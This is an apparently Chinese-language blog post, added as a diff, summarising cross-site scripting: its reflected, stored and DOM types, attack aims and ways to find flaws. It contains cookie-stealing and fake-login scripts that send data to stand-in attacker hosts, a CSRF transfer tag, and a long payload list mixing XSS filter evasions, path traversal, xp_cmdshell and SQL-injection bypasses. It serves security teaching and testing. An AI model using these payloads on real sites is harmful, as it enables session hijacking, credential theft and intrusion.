@@ -1,0 +1,1129 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="ALL," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="跨网站脚本（Cross-site scripting，通常简称为XSS或跨站脚本或跨站脚本攻击）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS跨站总结🔔">
+<meta property="og:url" content="https://menggeniu.github.io/2016/07/22/52/index.html">
+<meta property="og:site_name" content="NNNの博客">
+<meta property="og:description" content="跨网站脚本（Cross-site scripting，通常简称为XSS或跨站脚本或跨站脚本攻击）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意">
+<meta property="og:updated_time" content="2016-11-25T12:47:44.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS跨站总结🔔">
+<meta name="twitter:description" content="跨网站脚本（Cross-site scripting，通常简称为XSS或跨站脚本或跨站脚本攻击）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    sidebar: {"position":"right","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://menggeniu.github.io/2016/07/22/52/"/>
+
+
+
+
+
+  <title> XSS跨站总结🔔 | NNNの博客 </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">NNNの博客</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">世上所有的相遇都是久别重逢</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="https://menggeniu.github.io/2016/07/22/52/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="menggeNIU">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/avatar.png">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="NNNの博客">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="NNNの博客" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                XSS跨站总结🔔
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-07-22T22:37:47+08:00">
+                2016-07-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <a href="/2016/07/22/52/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/22/52/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+             <span id="/2016/07/22/52/" class="leancloud_visitors" data-flag-title="XSS跨站总结🔔">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               <span class="post-meta-item-text">阅读次数 </span>
+               <span class="leancloud-visitors-count"></span>
+              </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>跨网站脚本（Cross-site scripting，通常简称为XSS或跨站脚本或跨站脚本攻击）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。<br><br>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java， VBScript， ActiveX， Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。<br></p>
+<h4 id="原因："><a href="#原因：" class="headerlink" title="原因："></a>原因：</h4><p>有的服务器并没有对用户的输入进行安全方面的验证，攻击者就可以很容易地通过正常的输入手段，夹带进一些恶意的HTML脚本代码。当受害者的浏览器访问目标服务器上被注入恶意脚本的页面后，由于它对目标服务器的信任，这段恶意脚本的执行不会受到什么阻碍。而此时，XSS攻击就完成了。<br></p>
+<h4 id="种类"><a href="#种类" class="headerlink" title="种类:"></a>种类:</h4><h5 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="1. 反射型XSS"></a>1. 反射型XSS</h5><p>反射型XSS，又称非持久型XSS。(一般需要自行去触发，输入—输出)<br><br>反射：这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的。<br><br>非持久性：这种攻击方式往往具有一次性。<br><br>方式：<br><br>攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接时，注入脚本被传输到目标服务器上，然后服务器将注入脚本“反射”到受害者的浏览器上，从而在该浏览器上执行了这段脚本。<br><br> Eg：<br><br>攻击者将如下链接发送给受害者：<br><br>代码:<br></p>
+<pre><code>http://www.XXXX.com/search.asp?input=&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+</code></pre><p>当受害者点击这个链接的时候，注入的脚本被当作搜索的关键词发送到目标服务器的search.asp页面中，则在搜索结果的返回页面中，这段脚本将被当作搜索的关键词而嵌入。这样，当用户得到搜索结果页面后，这段脚本也得到了执行。这就是反射型XSS攻击的原理，可以看到，攻击者巧妙地通过反射型XSS的攻击方式，达到了在受害者的浏览器上执行脚本的目的。由于代码注入的是一个动态产生的页面而不是永久的页面，因此这种攻击方式只在点击链接的时候才产生作用，这也是它被称为非持久型XSS的原因。<br></p>
+<h5 id="2-存储型XSS"><a href="#2-存储型XSS" class="headerlink" title="2. 存储型XSS"></a>2. 存储型XSS</h5><p>存储型XSS，又称持久型XSS。(一般无意触发，输入–进入数据库*–取出数据库–输出)<br><br>持久性：攻击脚本将被永久地存放在目标服务器的数据库和文件中。<br><br>方式：<br><br>这种攻击多见于论坛或博客，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。<br><br>Eg：<br><br>恶意攻击者可以通过发一篇包含了恶意代码的帖子。<br></p>
+<pre><code>（帖子中包含了恶意代码，&lt;script&gt;window.open(“www.b.com?param=+document.cookie)&lt;/script&gt;）
+</code></pre><p>这时甲和乙看到了恶意攻击者的提子，当在查看帖子时就都中招了，他们的cookie信息都发送到了恶意攻击者的服务器上，攻击成功！ <br><br>可以看到，存储型XSS的攻击方式能够将恶意代码永久地嵌入一个页面当中，所有访问这个页面的用户都将成为受害者。如果我们能够谨慎对待不明链接，那么反射型的XSS攻击将没有多大作为，而存储型XSS则不同，由于它注入的往往是一些我们所信任的页面，因此无论我们多么小心，都难免会受到攻击。<br></p>
+<h5 id="3-DOM-XSS"><a href="#3-DOM-XSS" class="headerlink" title="3. DOM-XSS"></a>3. DOM-XSS</h5><p>DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞，它涉及的两个层次不是服务器端和浏览器端，而是浏览器端的JavaScript层和HTML层。更准确的说，就是服务器脚本变成了客户端脚本。<br><br>方式：<br><br>用户请求一个经过专门设计的URL，它由攻击者提交，且其中包含嵌入式JavaScript。服务器的响应中并不以任何形式包含攻击者的脚本。当用户的浏览器处理这个响应时，上述脚本得以处理。<br><br>Eg：<br></p>
+<pre><code>http://www.xxx.site/welcome.html?name=zhangsan
+</code></pre><p>使用以下的脚本打印出登录用户zhangsan的名字，即<br><br>代码:<br></p>
+<pre><code>&lt;SCRIPT&gt;
+var pos=docmnent.URL.indexOf(“name=”)+5;
+document.write (document.URL.substring(pos,document.URL.length));
+&lt;/SCRIPT&gt;
+</code></pre><p>如果这个脚本用于请求<a href="http://www.xxx.site/welcome.html?name=" target="_blank" rel="external">http://www.xxx.site/welcome.html?name=</a><script>alert(“XSS”)</script>时，就导致XSS攻击的发生。<br><br>当用户点击这个链接，服务器返回包含上面脚本的HTML静态文本，用户浏览器把HTML文本解析成DOM，DOM中的document对象URL属性的值就是当前页而的URL。在脚本被解析时，这个URL属性值的一部分被写入HTML文本，而这部分HTML文本却是JavaScript脚本，这使得<script>alert(“XSS”)</script>成为页面最终显示的HTML文本，从而导致DOM—base XSS攻击发生。<br></p>
+<h4 id="常用的攻击手段和目的"><a href="#常用的攻击手段和目的" class="headerlink" title="常用的攻击手段和目的"></a>常用的攻击手段和目的</h4><h5 id="1-窃取Cookie"><a href="#1-窃取Cookie" class="headerlink" title="1.  窃取Cookie"></a>1.  窃取Cookie</h5><p>盗用 cookie （主要），获取敏感信息，比如盗取各类用户账号、控制企业数据、盗窃企业重要的具有商业价值的资料、非法转账等等。<br><br>代码：<br></p>
+<pre><code>&lt;script&gt;location.href = &apos;http://www.Yoursite.com/Stealer.php?cookie=&apos;+document.cookie;&lt;/script&gt;
+</code></pre><p>其中location.href是指页面跳转到<br><br>代码:<br></p>
+<pre><code>http://www.VulnerableSite.com/index.php?search=&lt;script&gt;location.href = &apos;http://www.Yoursite.com/Stealer.php?cookie=&apos;+document.cookie;&lt;/script&gt;
+</code></pre><p>或者<br><br>代码:<br></p>
+<pre><code>&gt;&lt;a href=&quot;#&quot; onclick=&quot;document.location=&apos;http://yoursite.com/whateveryouwant.php?cookie=&apos; +escape(document.cookie);&quot;&gt;&lt;Click Me&gt;&lt;/a&gt;&lt;/script&gt;
+document.location和location.href基本一样
+</code></pre><p>通过XSS攻击，由于注入代码是在受害者的浏览器上执行，因此能够很方便地窃取到受害者的Cookie信息。比如，我们只要注入类似如下的代码：<br></p>
+<pre><code>&lt;script&gt;location.replace(“http://www.attackpage.com/record.asp?secret=“+document.cookie)&lt;/script&gt;
+</code></pre><p>当受害者的浏览器执行这段脚本的时候，就会自动访问攻击者建立的网站<a href="http://www.attackpage.com，打开其中的recou...ookie信息。" target="_blank" rel="external">http://www.attackpage.com，打开其中的recou...ookie信息。</a><br><br>得到受害者的Cookie信息后，攻击者可以很方便地冒充受害者，从而拥有其在目标服务器上的所有权限，相当于受害者的身份认证被窃取了。这样，攻击者可以任意地利用受害者的身份访问服务器上的资源和服务，甚至对受害者和服务器上的数据进行破坏。如果受害者拥有管理员权限，攻击者还可以利用其提升自己账号的权限，从而进行进一步的攻击。<br><br>注：Cookie，有时也用其复数形式Cookies，指某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据（通常经过加密）<br><br>document.location.href和document.location.replace都可以实现从A页面切换到B页面，但他们的区别是：<br><br>用document.location.href切换后，可以退回到原页面。而用document.location.replace切换后，不可以通过“后退”退回到原页面。<br><br>关于document.location.href或其他可回退的切换方式<br><br>document.location 相当于 document.URL 声明了装载文档的URL,除非发生了服务器重定向, 否则该属性的值与Window.location.href的值是一样的.<br></p>
+<h5 id="2-钓鱼"><a href="#2-钓鱼" class="headerlink" title="2.钓鱼"></a>2.钓鱼</h5><p>所谓钓鱼攻击就是构建一个钓鱼页面，诱骗受害者在其中输入一些敏感信息，然后将其发送给攻击者。利用XSS的注入脚本，我们也可以很方便地注入钓鱼页面的代码，从而引导钓鱼攻击。比如下面这样一段代码：<br></p>
+<pre><code>      &lt;script&gt;
+function hack()
+{
+                   location.replace(“http://www.attackpage.com/record.asp?username=“
++document.forms[0].user.value + “password=” + document.forms[0].pass.value);
+}
+&lt;/script&gt;
+&lt;form&gt;
+&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;这个功能需要登录:&lt;/H3 &gt;
+&lt;br&gt;&lt;br&gt;请输入用户名：&lt;br&gt;
+&lt;input type=”text” id=”user”name=”user”&gt;
+&lt;br&gt;请输入密码：&lt;br&gt;
+&lt;input type=”password” name =“pass”&gt;
+&lt;br&gt;&lt;input type=”submit”name=”login” value=”登录”onclick=”hack()”&gt;
+&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;
+</code></pre><p>注入上面的代码后，则会在原来的页面上，插入一段表单，要求用户输入自己的用户名和密码，而当用户点击“登录”按钮后，则会执行hack()函数，将用户的输入发送到攻击者指定的网站上去。这样，攻击者就成功窃取了该用户的账号信息。可以看到，和一般的钓鱼攻击不同，XSS引导的钓鱼攻击由于是对用户信任的网站页面进行修改，因此隐蔽性很高，而用户的账号失窃往往会带来重大的损失，因此它的危害也是十分巨大的。<br></p>
+<h5 id="3-跨站请求伪造"><a href="#3-跨站请求伪造" class="headerlink" title="3.跨站请求伪造"></a>3.跨站请求伪造</h5><p>跨站请求伪造（Cross-SiteRequest Forgery，CSRF），作为OWASP组织的2007年提出十大安全漏洞第五，它也属于XSS攻击的一种衍生。所谓跨站请求伪造，就是攻击者利用XSS注入攻击的方式，注入一段脚本，而当受害者的浏览器运行这段脚本时，脚本伪造受害者发送了一个合法请求。比如我们注入如下的HTML代码：<br></p>
+<pre><code>&lt;imgsrc = “http://www.bank.com/transfer.do?toAct=123456&amp;money=10000&gt;
+</code></pre><p>假如上面的代码中所访问的是某个银行网站的转账服务，则当受害者的浏览器运行这段脚本时，就会向攻击者指定的账户（示例的123456）执行转账操作。由于这个转账请求是在受害者的浏览器中运行的，因此浏览器也会自动将受害者的Cookie信息一并发送。这样，发送的请求就好像是受害者自己发送的一样，银行网站也将认可这个请求的合法性，攻击者也就达到了伪造请求的目的。<br></p>
+<h5 id="4-注入恶意软件"><a href="#4-注入恶意软件" class="headerlink" title="4.注入恶意软件"></a>4.注入恶意软件</h5><p>除了直接注入恶意脚本以外，通过XSS攻击，攻击者也可以很方便地在脚本中引入一些恶意软件，比如病毒、木马、蠕虫等等。例如，攻击者可以在某个自己建立的页面上放置一些恶意软件，然后用XSS注入的方式，插入一段引用该页面的脚本。这样当受害者的浏览器执行这段脚本的时候，就会自动访问放置了恶意软件的页面，从而受到这些恶意软件的感染。<br><br>利用XSS注入恶意软件的方式，攻击者可以很方便地在互联网上传播病毒、木马和蠕虫，通过这种途径，攻击者就可以通过这些病毒、木马和蠕虫，进一步地对受害者的主机发动攻击。目前，互联网上的“挂马”现象非常普遍，而XSS注入的出现也无疑给“挂马”的攻击者指明了又一个新的方向。通过传播这些木马，窃取合法用户的敏感信息，不少非法攻击者也逐渐将这一过程产业化，经常可以见到以信封方式批量兜售账号密码的现象。这也给许多正常的网络用户造成了许多无法挽回的巨大损失，造成的危害也很大。<br></p>
+<h4 id="挖掘方式："><a href="#挖掘方式：" class="headerlink" title="挖掘方式："></a>挖掘方式：</h4><ol>
+<li>对于反射型XSS以及一些DOM XSS，一般建议是开发一些自动化的扫描工具进行扫描，并辅以手工分析。 另外一方面，搜索引擎也是快速寻找具有缺陷参数的好办法。 具体可见：白帽子信息_心伤的瘦子 <br></li>
+<li>对于存储型XSS， <ol>
+<li>对于单纯的输入-&gt;存储-&gt;输出点 的情况 （输入与输出点关系：一个地方输入，会有多个地方输出；不同地方输入，同一地方输出。）。常规测试是正向直接输入内容，然后在输出点查看是否未过滤，当然你也可以先大胆假设输出点未过滤，反向寻找在何处进行输入，进而测试。</li>
+<li>对于富文本，则需要对过滤器进行fuzz测试（人脑+自动化）了，可参照：fuzzing XSS filter</li>
+<li>第三类，就是一些WEB应用中所出现的DOM-存储型XSS，即输出点的无害内容，会经过js的一些dom操作变得危险（本质上和 第1点里的dom xss成因是一样的）。这一类的挖掘方法，个人觉得不太好总结。 其一，需要熟悉WEB应用的功能，其二，知道功能所对应的JS代码有哪些，其三，凭直觉猜测程序员会在哪些功能出现可能导致XSS的过滤遗忘或过滤错误（直觉是唬人的，其实就是你知道某些功能会需要某些代码实现，而这些代码常常容易出错），其四，需要有较好的代码阅读跟踪能力（JS一大坨。。还是蛮难读的…. 有些代码被混淆过，十分不易阅读，就会涉及到如何下断点进行调试的小技巧）。 我想，挖掘这一类的前提可能是需要有不错的前端开发经验，写多了，才会有足够的嗅觉。</li>
+</ol>
+</li>
+</ol>
+<h4 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h4><pre><code>&quot;&gt;&lt;svg&gt;&lt;script xlink:href=//********&gt;&lt;/script&gt;
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+javascript：console.log(0)
+&lt;script&gt;console.log(1)&lt;/script&gt;
+&apos;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+=&apos;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+&lt;script&gt;alert(vulnerable)&lt;/script&gt;
+%3Cscript%3Ealert(&apos;XSS&apos;)%3C/script%3E
+&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;
+&lt;img src=&quot;javascript：alert(&apos;XSS&apos;)&quot;&gt;
+%0a%0a&lt;script&gt;alert(\&quot;Vulnerable\&quot;)&lt;/script&gt;.jsp
+%22%3cscript%3ealert(%22xss%22)%3c/script%3e
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini
+%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e
+%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e
+%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html
+%3f.jsp
+%3f.jsp
+&lt;script&gt;alert(&apos;Vulnerable&apos;);&lt;/script&gt;
+&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;
+?sql_debug=1
+a%5c.aspx
+a.jsp/&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;
+a/
+a?&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;
+&quot;&gt;&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;
+&apos;;exec%20master..xp_cmdshell%20&apos;dir%20 c:%20&gt;%20c:\inetpub\wwwroot\?.txt&apos;--&amp;&amp;
+%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+%3Cscript%3Ealert(document. domain);%3C/script%3E&amp;
+%3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID={SESSION_ID}&amp;SESSION_ID=
+1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname=
+http://www.cnblogs.com/http://ww ... logs.com/etc/passwd
+..\..\..\..\..\..\..\..\windows\system.ini
+\..\..\..\..\..\..\..\..\windows\system.ini
+&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()}
+&lt;IMG src=&quot;javascript：alert(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG src=javascript：alert(&apos;XSS&apos;)&gt;
+&lt;IMG src=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;
+&lt;IMG src=JaVaScRiPt:alert(&quot;XSS&quot;)&gt;
+&lt;IMG src=javascript：alert(&apos;XSS&apos;)&gt;
+&lt;IMG src=javascript：alert(&apos;XSS&apos;)&gt;
+&lt;IMG src=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
+&lt;IMG src=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG src=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG src=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;
+&quot;&lt;IMG src=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&apos; &gt; out
+&lt;IMG src=&quot; javascript：alert(&apos;XSS&apos;);&quot;&gt;
+&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;
+&lt;BODY BACKGROUND=&quot;javascript：alert(&apos;XSS&apos;)&quot;&gt;
+&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;
+&lt;IMG DYNSRC=&quot;javascript：alert(&apos;XSS&apos;)&quot;&gt;
+&lt;IMG LOWSRC=&quot;javascript：alert(&apos;XSS&apos;)&quot;&gt;
+&lt;BGSOUND src=&quot;javascript：alert(&apos;XSS&apos;);&quot;&gt;
+&lt;br size=&quot;&amp;{alert(&apos;XSS&apos;)}&quot;&gt;
+&lt;LAYER src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/layer&gt;
+&lt;LINK REL=&quot;stylesheet&quot; href=&quot;javascript：alert(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG src=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;
+&lt;IMG src=&quot;mocha:&quot;&gt;
+&lt;IMG src=&quot;livescript:&quot;&gt;
+&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript：alert(&apos;XSS&apos;);&quot;&gt;
+&lt;IFRAME src=javascript：alert(&apos;XSS&apos;)&gt;&lt;/IFRAME&gt;
+&lt;FRAMESET&gt;&lt;FRAME src=javascript：alert(&apos;XSS&apos;)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;
+&lt;TABLE BACKGROUND=&quot;javascript：alert(&apos;XSS&apos;)&quot;&gt;
+&lt;DIV STYLE=&quot;background-image: url(javascript：alert(&apos;XSS&apos;))&quot;&gt;
+&lt;DIV STYLE=&quot;behaviour: url(&apos;http://www.how-to-hack.org/exploit.html&apos;);&quot;&gt;
+&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;
+&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;
+&lt;IMG STYLE=&apos;xss:expre\ssion(alert(&quot;XSS&quot;))&apos;&gt;
+&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;
+&lt;STYLE TYPE=&quot;text/css&quot;&gt;.XSS{background-image:url(&quot;javascript：alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;A class=&quot;XSS&quot;&gt;&lt;/A&gt;
+&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript：alert(&apos;XSS&apos;)&quot;)}&lt;/STYLE&gt;
+&lt;BASE href=&quot;javascript：alert(&apos;XSS&apos;);//&quot;&gt;
+getURL(&quot;javascript：alert(&apos;XSS&apos;)&quot;)
+a=&quot;get&quot;;b=&quot;URL&quot;;c=&quot;javascript：&quot;;d=&quot;alert(&apos;XSS&apos;);&quot;;eval(a+b+c+d);
+&lt;XML src=&quot;javascript：alert(&apos;XSS&apos;);&quot;&gt;
+&quot;&gt; &lt;BODY ONLOAD=&quot;a();&quot;&gt;&lt;SCRIPT&gt;function a(){alert(&apos;XSS&apos;);}&lt;/SCRIPT&gt;&lt;&quot;
+&lt;SCRIPT src=/uploadfile/2015/0126/20150126034957941.jpg&quot;&gt;&lt;/SCRIPT&gt;
+&lt;IMG src=&quot;javascript：alert(&apos;XSS&apos;)&quot;
+&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=http://xss.ha.ckers.org/a.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;
+&lt;IMG src=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;
+&lt;SCRIPT a=&quot;&gt;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT =&quot;&gt;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT a=&quot;&gt;&quot; &apos;&apos; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;A href=http://www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt;
+admin&apos;--
+&apos; or 0=0 --
+&quot; or 0=0 --
+or 0=0 --
+&apos; or 0=0 #
+&quot; or 0=0 #
+or 0=0 #
+&apos; or &apos;x&apos;=&apos;x
+&quot; or &quot;x&quot;=&quot;x
+&apos;) or (&apos;x&apos;=&apos;x
+&apos; or 1=1--
+&quot; or 1=1--
+or 1=1--
+&apos; or a=a--
+&quot; or &quot;a&quot;=&quot;a
+&apos;) or (&apos;a&apos;=&apos;a
+&quot;) or (&quot;a&quot;=&quot;a
+hi&quot; or &quot;a&quot;=&quot;a
+hi&quot; or 1=1 --
+hi&apos; or 1=1 --
+hi&apos; or &apos;a&apos;=&apos;a
+hi&apos;) or (&apos;a&apos;=&apos;a
